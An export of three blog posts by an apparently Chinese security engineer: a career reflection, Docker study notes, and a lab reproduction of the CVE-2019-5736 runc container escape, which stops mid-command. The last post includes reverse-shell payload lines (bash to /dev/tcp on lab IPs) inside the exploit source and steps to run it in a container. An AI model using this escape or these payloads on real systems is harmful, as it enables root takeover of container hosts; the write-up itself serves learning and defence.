[{"title":"重新出发","url":"/2025/08/17/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/","content":"重新出发\n今-2025年8月，一枚末流211本科毕业，从事网络安全相关工作5年的工程师（牛马），随着年龄、见识的增长，感觉前路有些许迷雾，重新搭建一个博客（避免熟人发现），梳理来路思考未来方向，跳出围城，不应该缺少重新出发的勇气。\n来时路\n2020年信息安全专业毕业，恰好遇上了口罩，毕业典礼都没有(ㄒoㄒ)。大学也确实没学到什么本事，家里没有人能给什么建议，想就业没有找实习，考研也没有想法，大学时懒惰，但是好在学习成绩还可以，靠着毕业设计的知识，勉强入职了家小公司做安全服务。\n初创公司就几个人，做的东西很多很杂，现在回想也很感谢当初的老板让我学会了很多。技术学会了渗透、应急、java代码审计，后来还给公司的研发搭建了完整的SDLC，小公司的工作内容包括(大牛马)：售前支持，售后执行，项目经理。\n\n售前支持：协助销售对接客户，参与需求沟通与方案讲解，结合客户业务场景提供针对性安全测试建议，支撑销售签单；\n售后执行：销售签单后，作为核心接口人对接客户，明确测试范围、获取系统权限、梳理业务流程等关键测试信息，确保测试方向与客户需求一致；\n项目经理：从项目启动到最终交付，全程负责进度把控、问题协调与结果验收，保障客户满意度。\n\n是的干的很多，很杂，很累，工资还低（比996狠）~~，公司从开始的6人到后来的70人。\n2022年7月。多种原因裸辞了，7月中旬开始投简历一直没有合适的机会，恰好HW要开始了，找朋友要了个机会，去了某个供电所值班（闲-休息）。行情好一天税后3.5K，很开心。HW之后所在地（保密）的工作机会确实太少，群里看到有北京的机会，一投就上岸了，是一家央企的子公司。\n2022年10月。第一次来北京，记得天气微凉，南方的人不太适应北京的干，买了加湿器，去了故宫，天安门，颐和园，然后居家了。。入职是正常的，8号就入职了，央企的福利还是不错了，加班也不多，一下子非常不习惯（🐂当多了）。工作内容也变得垂直：渗透测试、应急响应。也熟悉了一些漏洞管理、安全加固、合规相关的工作，从乙方安全服务转向了甲方安全建设。\n2025年8月。在这家公司工作了三年，考了PTS，后续应该会考CISSP。工作的内容已经变得程序化，机械化，感觉自己的可替代性太强了。公司流程规定的升职涨薪都没有落实，和朋友们聊天我现在的年薪是他们的1/3，差距还是挺大的，而且公司是市场化经营也不是那么稳，有10%的淘汰率，思考走人了，毕竟远离家乡就是赚钱来的。\n理思绪\n目前我的技能有攻防，应急，代码审计（刚拿起来，写前已经审计了两个CMS的洞了）。之前看到过这么一句话，人的精力有限，选择一个想做的方向去做到不可替代，攻防我感觉入行简单可替代性强，结合入行就一直有的理想，可以自己运营一家公司或者一个产品线的安全，就是想做安全架构师，看了看最新的发展（招聘），云计算和AI是目前最火的方向。安全一直都是锦上添花的，AI还没有那么成熟，云目前相对成熟。后续打算研究云相关的安全+代码审计+应急响应，加强自己的不可替代性。看到很多SDL在招聘，和我想做，能力图谱都和我的技能非常相近，农历25年底准备出击这个岗位，希望可以成功。\n谈规划\n写这篇总结，对于SDL只有初步的概念，认知还是有限，只能先做再调整。\n\n\n云常用组件漏洞原理、复现、修复知识学习。\n\nDocker、K8s、GitLab、Jenkins、Prometheus+Grafana、ELK\n\n\n\n代码审计能力持续强化\n\nJava利用链的学习和挖掘\nCodeQL使用，写出通用漏洞的规则\n\n\n\n搭建 DevSecOps 环境\n\n搭建环境\nOWASP Threat Dragon、SonarQube、OWASP Dependency-Check、Checkov、Clair学习\n\n\n\n‍\n‍\n","categories":["阶段总结"]},{"title":"Docker基本知识总结","url":"/2025/08/20/Docker%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/","content":"本文是学习《每天五分钟玩转Docker容器技术》的总结。是基础知识学习，熟悉docker容器技术，为了更好的研究docker相关漏洞。\n容器知识图谱\n​\n‍\n容器的基本架构\n\nDocker客户端：Client​\nDocker服务器：Docker daemon​\nDocker镜像：Image​\nDocker仓库：Registry​\nDocker容器：Container​\n\n​\n通过docker我们可以方便地在Host上构建和运行容器。最常用的Docker客户端是docker命令。用户也可以通过REST API与服务器通信。\n常用的命令\n\n\n\n命令分类\n命令\n功能说明\n常用示例\n\n\n\n\n容器生命周期管理\n​docker run​​\n创建并启动容器\n​docker run -d -p 80:80 --name mynginx nginx（后台启动 nginx，映射 80 端口）\n\n\n\n​docker start [容器名/ID]​\n启动已停止的容器\n​docker start mynginx​\n\n\n\n​docker stop [容器名/ID]​\n停止运行中的容器（优雅关闭）\n​docker stop mynginx​\n\n\n\n​docker restart [容器名/ID]​\n重启容器\n​docker restart mynginx​\n\n\n\n​docker rm [容器名/ID]​\n删除容器（需先停止，-f 强制删除运行中容器）\n​docker rm -f mynginx​\n\n\n容器查看\n​docker ps​\n查看运行中的容器\n​docker ps -a（查看所有容器，包括已停止）\n\n\n\n​docker inspect [容器名/ID]​​\n查看容器详细信息（配置、网络等）\n​docker inspect mynginx​\n\n\n\n​docker logs [容器名/ID]​​\n查看容器日志（-f 实时跟踪，–tail 100 查看最后 100 行）\n​docker logs -f mynginx​\n\n\n容器操作\n​docker exec -it [容器名/ID] [命令]​​\n进入运行中的容器并执行命令（-it 交互模式）\n​docker exec -it mynginx /bin/bash（进入 bash 终端）\n\n\n\n​docker cp [本地路径] [容器名/ID]:[容器路径]​\n从本地复制文件到容器\n​docker cp ./test.txt mynginx:/tmp/​\n\n\n\n​docker cp [容器名/ID]:[容器路径] [本地路径]​\n从容器复制文件到本地\n​docker cp mynginx:/tmp/test.txt ./​\n\n\n\n​docker top [容器名/ID]​​\n查看容器内运行的进程\n​docker top mynginx​\n\n\n镜像管理\n​docker images​\n查看本地镜像\n​docker images -a（包括中间镜像）\n\n\n\n​docker pull [镜像名:标签]​\n从仓库拉取镜像\n​docker pull mysql:8.0​\n\n\n\n​docker push [镜像名:标签]​\n推送镜像到仓库（需先登录）\n​docker push myrepo/myimage:v1​\n\n\n\n​docker rmi [镜像名/ID]​\n删除本地镜像（-f 强制删除，需先删除依赖容器）\n​docker rmi -f nginx​\n\n\n\n​docker build -t [镜像名:标签] [Dockerfile路径]​\n基于 Dockerfile 构建镜像\n​docker build -t myapp:v1 .（当前目录的 Dockerfile）\n\n\n镜像信息\n​docker image inspect [镜像名/ID]​​\n查看镜像详细信息\n​docker image inspect nginx​\n\n\n\ndocker history [镜像名/ID]​​\n查看镜像构建历史（各层操作）\n​docker history nginx​\n\n\n仓库管理\n​docker login [仓库地址]​\n登录 Docker 仓库（默认 Docker Hub）\n​docker login（登录 Docker Hub）\n\n\n\n​docker logout [仓库地址]​\n退出仓库登录\n​docker logout​\n\n\n\n​docker search [关键词]​\n搜索仓库中的镜像\n​docker search python​\n\n\n数据卷管理\n​docker volume create [卷名]​\n创建数据卷（持久化存储）\n​docker volume create myvol​\n\n\n\n​docker volume ls​\n查看所有数据卷\n​docker volume ls​\n\n\n\n​docker volume inspect [卷名]​\n查看数据卷详细信息\n​docker inspect myvol​\n\n\n\n​docker volume rm [卷名]​\n删除数据卷\n​docker volume rm myvol​\n\n\n网络管理\n​docker network ls​\n查看 Docker 网络\n​docker network ls​\n\n\n\n​docker network create [网络名]​\n创建自定义网络（默认 bridge 模式）\n​docker network create mynet​\n\n\n\n​docker network connect [网络名] [容器名/ID]​\n将容器连接到指定网络\n​docker network connect mynet mynginx​\n\n\n\n​docker network disconnect [网络名] [容器名/ID]​\n断开容器与网络的连接\n​docker network disconnect mynet mynginx​\n\n\n系统信息\n​docker info​\n查看 Docker 系统信息（版本、镜像数、容器数等）\n​docker info​\n\n\n\n​docker version​\n查看 Docker 客户端和服务端版本\n​docker version​\n\n\n\n​\nREST API 需要Docker daemon配置开启端口，很多未授权漏洞就是这个原因：\n#Linux 系统 编辑 /etc/docker/daemon.json&#123;  &quot;hosts&quot;: [&quot;unix:///var/run/docker.sock&quot;, &quot;tcp://0.0.0.0:2375&quot;]&#125;Windows/macOS：通过 Docker Desktop 配置：进入 Settings → Docker Engine，在 JSON 配置中添加上述 hosts 字段，点击 Apply &amp; Restart。客户端连接：docker -H 192.168.56.102 info\n//安全配置1、TLS 证书认证,客户端使用证书认证访问API（网上随便都有教程不写了）2、最小权限原则：仅开放必要的 API 端口（2376），并限制来源 IP（通过防火墙）。3、定期轮换证书：TLS 证书设置较短有效期（如 90 天），定期更新。4、日志审计：开启 Docker 和反向代理（如果有）的访问日志，监控异常请求。5、使用网络隔离：将 Docker API 部署在私有网络，避免直接暴露公网。\nDocker镜像\nDockerfile是镜像的描述文件，定义了如何构建Docker镜像。\nFROM debianRUN apt-get install emacsRUN apt-get install apache2CMD [&quot;/bin/bash&quot;]\n新镜像是从base镜像(内核和host一样)一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一层。分层结构最大的一个好处就是：共享资源\n​\n#构建镜像docker build -t [镜像名:标签] [Dockerfile路径]docker commit [选项] &lt;容器ID或名称&gt; &lt;新镜像名[:标签]&gt;  //现有容器打包成镜像#dockerfile语法FROM  \t\t#指定base镜像。MAINTAINER  #设置镜像的作者，可以是任意字符串。COPY  \t\t#将文件从build context复制到镜像。COPY src destADD \t\t#与COPY类似，不同的是，如果src是归档文件（tar、zip、tgz、xz等）文件会被自动解压到dest。ENV \t\t#设置环境变量，环境变量可被后面的指令使用。EXPOSE \t\t#指定容器中的进程会监听某个端口，Docker可以将该端口暴露出来。VOLUME \t\t#将文件或目录声明为volume。WORKDIR \t#为后面的RUN、CMD、ENTRYPOINT、ADD或COPY指令设置镜像中的当前工作目录。RUN \t\t#在容器中运行指定的命令。CMD \t\t#容器启动时运行指定的命令。Dockerfile中可以有多个CMD指令，但只有最后一个生效。CMD可以被dockerrun之后的参数替换。ENTRYPOINT \t#设置容器启动时运行的命令。Dockerfile中可以有多个ENTRYPOINT指令，但只有最后一个生效。CMD或docker run之后的参数会被当作参数传递给ENTRYPOINT。\nDocker容器\n镜像启动的实例。\n资源限制\n#内存限额 -m 或 --memorydocker run -m 200M --menmory-swap=300M ubantu#CPU限额 -c 或 --cpu-sharesdocker run --name A -c 1024 ubantu #Block IO带宽限额 限制容器写 /dev/sda的速率为30 MB/sdocker run -it --device-write-bps /dev/sda:30MB ubantu--device-read-bps：限制读某个设备的bps。--device-write-bps：限制写某个设备的bps。--device-read-iops：限制读某个设备的iops。--device-write-iops：限制写某个设备的iops。bps是byte per second，每秒读写的数据量。iops是io per second，每秒IO的次数。\n容器的底层技术\ncgroup实现资源限额，namespace实现资源隔离。\ncgroup\ncgroup全称Control Group。Linux操作系统通过cgroup可以设置进程使用CPU、内存和IO资源的限额。上面的 --cpu-shares、-m、–device-write-bps 实际上就是在配置cgroup。可以在宿主机或者容器内  /sys/fs/cgroup中找到它。有一个漏洞CVE-2022-0492（cgroup逃逸）， 这里不展开写。\n\nnamespace\n在每个容器中，我们都可以看到文件系统、网卡等资源，这些资源看上去是容器自己的。拿网卡来说，每个容器都会认为自己有一块独立的网卡，即使host上只有一块物理网卡。Linux实现这种方式的技术是namespace。namespace管理着host中全局唯一的资源，并可以让每个容器都觉得只有自己在使用它。换句话说，namespace实现了容器间资源的隔离。\nLinux使用了6种namespace，分别对应6种资源：Mount、UTS、IPC、PID、Network和User。\n\n\nMount namespace让容器看上去拥有整个文件系统。\n\n\nUTS namespace让容器有自己的hostname。\n\n\nIPC namespace让容器拥有自己的共享内存和信号量（semaphore）来实现进程间通信，而不会与host和其他容器的IPC混在一起。\n\n\nPID namespace 让容器在host中以进程的形式运行。例如当前host中运行了两个容器。通过宿主机 ps axf 可以查看容器进程。所有容器的进程都挂在dockerd进程下，同时也可以看到容器自己的子进程。\n\n\nNetwork namespace让容器拥有自己独立的网卡、IP、路由等资源。\n\n\nUser namespace让容器能够管理自己的用户，host不能看到容器中创建的用户。\n\n\nDocker网络\n单个host上的容器网络\nnone网络\nnone网络就是什么都没有的网络。挂在这个网络下的容器除了lo，没有其他任何网卡。\ndocker run -itd --network=none httpd\nhost网络\n连接到host网络的容器共享Docker host的网络栈，容器的网络配置与host完全一样。\ndocker run -itd --network=host httpddocker inspect 309d1004f38c&quot;NetworkMode&quot;: &quot;host&quot;\nbridge网络\nDocker安装时会创建一个命名为docker0的Linux bridge。如果不指定–network，创建的容器默认都会挂到docker0上。 brctl show可以看网卡\n\ndocker run -itd httpddocker inspect da9b1b378e0f&quot;NetworkMode&quot;: &quot;default&quot;\n​\nuser-defined网络\n用户也可以根据业务需要创建user-defined网络。\ndocker network create --driver bridge my_net 1docker network inspect1 my_net #查看        &quot;IPAM&quot;: &#123;            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: &#123;&#125;,            &quot;Config&quot;: [                &#123;                    &quot;Subnet&quot;: &quot;172.18.0.0/16&quot;,                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;                &#125;            ]        &#125;,docker run -itd --network=my_net1 httpd#设置网络--subnet 172.22.16.0/24--gateway 172.22.16.1 #使用 --ip 指定IP 只有使用 --subnet创建的网络才能指定静态IP。docker network create --driver bridge my_net2 --subnet 172.22.16.0/24 --gateway 172.22.16.1 docker run -itd --network=my_net2 --ip 172.22.16.8 busybox\n不同的网卡 host 的 iptables 默认DROP 无法连通。如果需要连通，则需添加目标网络网卡\ndocker network connect my_net2 httpd容器ID\n容器间通信\n容器之间可通过IP, Docker DNS Server 或 joined 容器三种方式通信。两个容器要能通信，必须要有属于同一个网络的网卡。\n\n\nIP\n具体做法是在容器创建时通过 --network指定相应的网络，或者通过docker network connect将现有容器加入到指定网络。\n\n\nDocker DNS Server\ndocker daemon实现了一个内嵌的DNS server，使容器可以直接通过&quot;容器名&quot;通信。方法很简单，只要在启动时用 --name为容器命名就可以了。\n\n\njoined容器\njoined容器非常特别，它可以使两个或多个容器共享一个网络栈，共享网卡和配置信息，joined容器之间可以通过127.0.0.1直接通信。\ndocker run -d -it --name=web1 httpddocker run -it --network=container:web1 busybox#两个容器使用相同的网卡\n\n\n将容器与外部世界连接\n通过NAT, docker实现了容器对外网的访问。\n​\n（1）busybox发送ping包：172.17.0.2 &gt; www.bing.com。\n（2）docker0收到包，发现是发送到外网的，交给NAT处理。\n（3）NAT将源地址换成enp0s3的IP:10.0.2.15 &gt; www.bing.com。\n（4）ping包从enp0s3发送出去，到达www.bing.com。\n外部世界访问容器\ndocker可将容器对外提供服务的端口映射到host的某个端口，外网通过该端口访问容器。容器启动时通过-p参数映射端口。\ndocker run -d -p [host port]:[container port] httpd docker run -d -p 8080:80 httpd \n每一个映射的端口，host都会启动一个docker-proxy进程来处理访问容器的流量。\n​\n（1）docker-proxy监听host的32773端口。\n（2）当curl访问10.0.2.15:32773时，docker-proxy转发给容器172.17.0.2:80。\n（3）httpd容器响应请求并返回结果。\n‍\n跨多个host的网络\n跨主机网络方案：docker原生的overlay和macvlan; 第三方方案：常用的包括flannel、weave和calico。这些方案与docker集成是通过libnetwork、container network model​\nlibnetwork &amp; CNM\nlibnetwork是docker容器网络库，最核心的内容是其定义的Container Network Model（CNM）\n\nSandbox（类似存储interface、路由表和DNS设置的表）：Sandbox是容器的网络栈，包含容器的interface、路由表和DNS设置。LinuxNetwork Namespace是Sandbox的标准实现。Sandbox可以包含来自不同Network的Endpoint。\nEndpoint（类似网卡）：Endpoint的作用是将Sandbox接入Network。Endpoint的典型实现是veth pair，一个Endpoint只能属于一个网络，也只能属于一个Sandbox。\nNetwork（类似交换机）：Network包含一组Endpoint，同一Network的Endpoint可以直接通信。Network的实现可以是Linux Bridge、VLAN等。\n\nlibnetwork CNM定义了docker容器的网络模型，按照该模型开发出的driver就能与docker daemon协同工作，实现容器网络。\n​\noverlay\n容器跨主机通信，Docker提供了overlay driver，使用户可以创建基于VxLAN的overlay网络。VxLAN可将二层数据封装到UDP进行传输，VxLAN提供与VLAN相同的以太网二层服务，但是拥有更强的扩展性和灵活性。(就是新建了桥接网卡，容器可添加变为双网卡)\n#创建 docker network create   -d 指定网络driverdocker network create -d overlay ov_net1 \nmacvlan\nmacvlan本身是linux kernel模块，其功能是允许同一个物理网卡配置多个MAC地址，即多个interface，每个interface可以配置自己的IP。macvlan本质上是一种网卡虚拟化技术\ndocker network create -d macvlan --subnet=172.16.86.0/24 \\--gateway=172.16.86.1 -o parent=eth1 mac_net1-o parent指定使用的网络interface。\n\ndocker没有为macvlan提供DNS服务，这点与overlay网络是不同的。无法ping bbox1，只能通过IP。\nmacvlan网络是local网络，为了保证跨主机能够通信，用户一般需要自己管理IP subnet。\ndocker不会为macvlan创建网关，这里的网关应该是真实存在的，否则容器无法路由。\n\ndocker run -itd --name bbox1 --ip=172.16.86.10 --network nac_net1 busyboxdocker run -itd --name bbox2 --ip=172.16.86.11 --network nac_net1 busybox\nmacvlan不依赖Linux bridge, brctl show可以确认并没有创建新的bridge\n​\n用sub-interface实现多macvlan网络\nmacvlan会独占主机的网卡，也就是说一个网卡只能创建一个macvlan网络。macvlan不仅可以连接到interface（如enp0s9），也可以连接到sub-interface（如VLAN enp0s9.xxx）。\n不同macvlan网络之间不能通信。但准确的说法应该是：不同macvlan网络不能在二层上通信。在三层上可以通过网关将macvlan连通。可以借助中间网关连通。可以是物理路由，可以是某台主机配置的sub-interface网关IP。开启ip forward，以及iptables来充当虚拟路由器。\n如将Host 192.168.56.101配置成一个虚拟路由器，设置网关并转发VLAN10和VLAN20的流量。\n···\n//ip forward开启sysctl -w net.ipv4.ip_forward=1//在 /etc/network/interfaces中配置vlan sub-interfaceauto eth2 iface eth2 inet manualauto eth2.10 iface eth2.10 inet manual vlan-raw-device eth2auto eth2.20 iface eth2.20 inet manual vlan-raw-device eth2启用sub-interface：ifup eth2.10 ifup eth2.20//将网关IP配置到sub-interface：ifconfig eth2.10 172.16.10.1 netmask 255.255.255.0 up ifconfig eth2.20 172.16.20.1 netmask 255.255.255.0 up//添加iptables规则，转发不同VLAN的数据包。iptables -t nat -A POSTROUTING -o eth2.10 -j MASQUERADEiptables -t nat -A POSTROUTING -o eth2.20 -j MASQUERADEiptables -A FORWARD -i eth2.10-o eth2.20 -m state --state RELATED, ESTABLISHED -j ACCEPT iptables -A FORWARD -i eth2.20-o eth2.10 -m state --state RELATED, ESTABLISHED -j ACCEPTiptables -A FORWARD -i eth2.10-o eth2.20 -j ACCEPT iptables -A FORWARD -i eth2.20-o eth2.10 -j ACCEPT\n第三方需要特别搭建，文章篇幅不拓展了\nflannel\nflannel是CoreOS开发的容器网络解决方案。flannel为每个host分配一个subnet，容器从此subnet中分配IP，这些IP可以在host间路由，容器间无须NAT和portmapping就可以跨主机通信。同时没有隔离能力。\n每个subnet都是从一个更大的IP池中划分的，flannel会在每个主机上运行一个叫flanneld的agent，其职责就是从池子中分配subnet。为了在各个主机间共享信息，flannel用etcd（与consul类似的key-value分布式数据库）存放网络配置、已分配的subnet、host的IP等信息。\n‍\nweave\nweave是Weaveworks开发的容器网络解决方案。weave创建的虚拟网络可以将部署在多个主机上的容器连接起来。对容器来说，weave就像一个巨大的以太网交换机，所有容器都被接入这个交换机，容器可以直接通信，无须NAT和端口映射。除此之外，weave的DNS模块使容器可以通过hostname访问。weave不依赖分布式数据库（例如etcd和consul）交换网络信息，每个主机上只需运行weave组件就能建立起跨主机容器网络。\n默认配置下，weave使用一个大subnet（例如10.32.0.0/12），所有主机的容器都从这个地址空间中分配IP，因为同属一个subnet，容器可以直接通信。如果要实现网络隔离，可以通过环境变量WEAVE_CIDR为容器分配不同subnet的IP。\nweave是一个私有的VxLAN网络，默认与外部网络隔离。连通需要（1）首先将主机加入到weave网络。（2）然后把主机当作访问weave网络的网关。\n‍\ncalico\nCalico是一个纯三层的虚拟网络方案，Calico为每个容器分配一个IP，每个host都是router，把不同host的容器连接起来。与VxLAN不同的是，Calico不对数据包做额外封装，不需要NAT和端口映射，扩展性和性能都很好。Calico依赖etcd在不同主机间共享和交换信息，存储Calico网络状态。host192.168.56.101负责运行etcd。Calico网络中的每个主机都需要运行Calico组件，实现容器interface管理、动态路由、动态ACL、报告状态等。\n不同的calico网络，默认不能通行。calico默认的policy规则是：容器只能与同一个calico网络中的容器通信。\n‍\nDocker存储\nDocker为容器提供了两种存放数据的资源：由storage driver管理的镜像层和容器层和Data Volume​\nStorage driver\nstorage driver实现了多层数据的堆叠并为用户提供一个单一的合并之后的统一视图。Docker支持多种storage driver，有AUFS、Device Mapper、Btrfs、OverlayFS、VFS和ZFS。\n优先使用Linux发行版默认的storage driver。\nUbuntu默认driver用的是AUFS，底层文件系统是extfs\nRedhat/CentOS的默认driver是Device Mapper, SUSE则是Btrfs\n容器没有需要持久化的数据，随时可以从镜像直接创建。使用storage driver即可。\nData Volume\nData Volume本质上是Docker Host文件系统中的目录或文件，能够直接被mount到容器的文件系统中。\n（1）Data Volume是目录或文件，而非没有格式化的磁盘（块设备）。\n（2）容器可以读写volume中的数据。\n（3）volume数据可以被永久地保存，使用它的容器销毁不影响它。\n在具体的使用上，docker提供了两种类型的volume:bind mount和docker managed volume​\nbind mount\nbind mount是将host上已存在的目录或文件mount到容器。即使容器没有了，bind mount也还在。bind mount时还可以指定数据的读写权限，默认是可读可写，可指定为只读\n-v的格式为 &lt;host path&gt;:&lt;container path&gt;docker run -d -p 80:80 -v ~/htdocs:/usr/local/apache2/htdocs httpdro=Read-only 只有host有权修改数据，提高了安全性。docker run -d -p 80:80 -v ~/htdocs:/usr/local/apache2/htdocs:ro httpd\ndocker managed volume\ndocker managed volume与bind mount在使用上的最大区别是不需要指定mount源，随机在host生成。docker inspect 容器长ID 查看存储源位置。\ndocker run -d -p 80:80 -v /usr/local/apache2/htdocs httpd\n数据共享\n容器与host共享数据\n对于bind mount是非常明确的：直接将要共享的目录mount到容器。\ndocker managed volume就要麻烦点。由于volume位于host中的目录，是在容器启动时才生成，所以需要将共享数据复制到volume中。\ndocker run -d -p 80:80 -v /usr/local/apache2/htdocs httpddocker cp ~/htdocs/index.html 容器ID:/usr/local/apache2/htdocs\n容器之间共享数据\n将共享数据放在bind mount中，然后将其mount到多个容器。\ndocker run --name web1 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpddocker run --name web2 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpd\n另一种在容器之间共享数据的方式是使用volume container。volume container是专门为其他容器提供volume的容器。它提供的卷可以是bind mount，也可以是docker managed volume。\ndocker create vc_data \\-v ~/htdocs:/usr/local/apache2/htdocs \\-v /other/useful/tools httpddocker run --name web1 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpd\n容器命名为vc_data，docker create命令，这是因为volume container的作用只是提供数据，它本身不需要处于运行状态。\n\n\nbind mount，存放Web Server的静态文件。\n\n\ndocker managed volume，存放一些实用工具\n\n\n其他容器可以通过--volumes-from使用vc_data这个volume container\n\n\ndocker run --name web1 -d -p 80 --volumes-from vc_data httpddocker run --name web2 -d -p 80 --volumes-from vc_data httpd\ndata-packed volume container 将数据完全放到volume container中，同时又能与其他容器共享。原理是将数据打包到镜像中，然后通过docker managed volume共享。\nFROM busybox:latestADD htdocs /usr/local/apache2/htdocsVOLUME /usr/local/apache2/htdocs//build新镜像datapackeddocker build -t datapacked .ADD将静态文件添加到容器目录 /usr/local/apache2/htdocs。VOLUME的作用与 -v 等效，用来创建docker managed volume,mount point 为/usr/local/apache2/htdocs因为这个目录就是ADD添加的目录，所以会将已有数据复制到volume中。//build新镜像datapackeddocker create --name vc_data datapacked\n因为在Dockerfile中已经使用了VOLUME指令，这里就不需要指定volume的mount point了,启动httpd容器并使用data-packed volume container。和volume container其实一样。\ndocker run --name web2 -d -p 80:80 --volumes-from vc_data httpd\n容器监控\n监控子命令：ps、top和stats，然后是几个功能更强的开源监控工具sysdig、Weave Scope、cAdvisor和Prometheus\n//监控子命令docker container ps docker container top 容器ID  //某个容器中运行了哪些进程docker container stats //用于显示每个容器各种资源的使用情况//sysdigdocker container run -it --rm --name=sysdig --privileged=true \\ --volume=/var/run/docker.sock:/host/var/run/docker.sock \\ --volume=/dev:/host/dev \\ --volume=/proc:/host/proc:ro \\ --volume=/boot:/host/boot:ro \\ --volume=/lib/modules:/host/lib/modules:ro\\ --volume=/usr:/host/usr:ro \\ sysdig/sysdig//Weave Scopecurl -L git.io/scope -o /usr/local/bin/scope chmod a+x /usr/local/bin/scope scope launch//cAdvisordocker run \\ --volume=/:/rootfs:ro \\ --volume=/var/run:/var/run:rw \\--volume=/sys:/sys:ro \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --publish=8080:8080 \\ --detach=true \\ --name=cadvisor \\google/cadvisor:latest\nPrometheus提供了监控数据搜集、存储、处理、可视化和告警一套完整的解决方案。\n\nPrometheus Server：负责从Exporter拉取和存储监控数据，并提供一套灵活的查询语言（PromQL）供用户使用。\nExporter：负责收集目标对象（host、container等）的性能数据，并通过HTTP接口供Prometheus Server获取。\n可视化组件：Grafana能够与Prometheus无缝集成，提供完美的数据展示能力。\nAlertmanager：用户可以定义基于监控数据的告警规则，规则会触发告警。一旦Alertmanager收到告警，会通过预定义的方式发出告警通知。支持的方式包括Email、PagerDuty、Webhook等。\n\n​\n日志管理\nDocker logs\ndocker attach 容器ID  //只能记录attach执行后的日志 按Ctrl+p键，然后再按Ctrl+q键才能退出docker logs -f 容器ID\nELK\nELK是三个软件的合称：Elasticsearch、Logstash、Kibana。 Logstash-&gt;Elasticsearch-&gt;Kibana\n\nElasticsearch：一个近乎实时查询的全文搜索引擎。Elasticsearch的设计目标就是要能够处理和搜索巨量的日志数据。\nLogstash：读取原始日志，并对其进行分析和过滤，然后将其转发给其他组件（比如Elasticsearch）进行索引或存储。Logstash支持丰富的Input和Output类型，能够处理各种应用的日志。\nKibana：一个基于JavaScript的Web图形界面程序，专门用于可视化Elasticsearch的数据。Kibana能够查询Elasticsearch并通过丰富的图表展示结果。用户可以创建Dashboard来监控系统的日志。\n\ndocker run -p 5601:5601-p 9200:9200-p 5044:5044-it --name elk sebp/elk- 5601:Kibana web接口- 9200:Elasticsearch JSON接口- 5044:Logstash日志接收接口\n‍\n","categories":["云安全"]},{"title":"CVE-2019-5736(runc逃逸)","url":"/2025/08/21/CVE-2019-5736-runc%E9%80%83%E9%80%B8/","content":"影响版本\n\nrunc 1.0.0-rc6 及更早版本\nDocker 18.09.2 之前的版本\nKubernetes、LXC、Apache Mesos 等依赖 runc 的容器平台\n\n漏洞原理\nCVE-2019-5736 的核心原理是runc 进程在启动容器时未正确隔离自身文件描述符，导致容器内恶意进程可覆盖宿主机的 runc 二进制文件，最终实现容器逃逸并获取宿主机 root 权限。\n利用方式：\n\n文件描述符泄露： runc 启动容器时，会通过/proc/self/exe（指向自身二进制文件）创建进程，且未关闭该文件描述符（FD）。容器内的进程可通过/proc/self/fd/访问此泄露的 FD，该 FD 直接指向宿主机上的 runc 二进制文件。\n覆盖宿主机 runc： 容器内的恶意进程通过该 FD 以可写方式打开宿主机 runc 文件，循环写入恶意代码。\n触发条件：攻击者需控制容器，由于 runc 通常以 root 权限执行，覆盖runc 后，宿主机后续任何调用 runc 的操作（如docker run）都会触发恶意代码，导致攻击者获得宿主机 root 权限。\n\n注：文件描述符用于标识进程打开的文件、设备、管道等资源。runc 作为容器运行时，在启动和管理容器的过程中会涉及大量文件描述符的操作，这些 FD 用于与宿主机的文件系统、设备、管道等进行交互。\n环境搭建\n安装漏洞版本\n#centos7yum list docker-ce --showduplicates | sort -ryum install docker-ce-18.06.1.ce-3.el7 -y[root@localhost ~]# systemctl start docker.service [root@localhost ~]#  docker -vDocker version 18.06.1-ce, build e68fc7a[root@localhost ~]# docker-runc -vrunc version 1.0.0-rc5+devcommit: 69663f0bd4b60df09991c08812a60108003fa340spec: 1.0.0\n配置进镜像源\n# 创建Docker配置目录sudo mkdir -p /etc/docker# 配置加速器（以阿里云为例，可替换为其他源）sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;  &quot;registry-mirrors&quot;: [    &quot;https://docker.xuanyuan.me&quot;  ]&#125;EOF# 重启Docker服务sudo systemctl daemon-reloadsudo systemctl restart docker\n在受害者机器上启动一个容器，搭建攻击环境\n[root@localhost ~]# docker pull nginx[root@localhost ~]# docker run --name nginx-test -p 8080:80 -d nginx[root@localhost ~]# docker ps -a\n\n漏洞复现\n方法一 docker runc触发\nPOC\n此漏洞将覆盖 runc 的实现，这将导致您的系统无法再运行 Docker 容器。请备份 /usr/bin/docker-runc 或 /usr/bin/runc\ncp /usr/bin/docker-runc /usr/bin/docker-runc.bak\n#修改mian.govar payload = &quot;#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/192.168.247.135/8887 0&gt;&amp;1&quot;#go环境wget https://dl.google.com/go/go1.14.linux-amd64.tar.gztar -zxf go1.14.linux-amd64.tar.gz -C /usr/localvi /etc/profile\t#golang env config\texport GO111MODULE=on\texport GOROOT=/usr/local/go \texport GOPATH=/home/gopath\texport PATH=$PATH:$GOROOT/bin:$GOPATH/binsource /etc/profile # 编译当前目录的 Go 程序，输出为 expCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o exp main.go\n攻击者需要在容器内执行命令，并启动一个用于监听的恶意二进制文件。当有人（攻击者或受害者）利用该docker exec漏洞进入容器时，就会触发漏洞，允许以 root 身份执行代码。\ndocker cp /root/Desktop/CVE-2019-5736-PoC-master/exp nginx-test:/homedocker exec -it nginx-test /bin/shcd home &amp;&amp; chmod +x exp &amp;&amp; ./exp\n\n直接使用host监听8887\n\n重新开启另终端进入容器 /bin/sh​\ndocker exec -it nginx-test /bin/sh\n\n\n‍\n方法二 恶意 Docker 镜像\nPOC\n创建一个恶意 Docker 镜像。当该镜像运行时，漏洞利用代码将会触发。无需在容器中执行 exec 操作。\n修改 stage2.c​\nconst char *poc = &quot;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.247.129/6666 0&gt;&amp;1  &amp;\\n&quot;;\n‍cd cve-2019-5736-poc-isodocker build -t 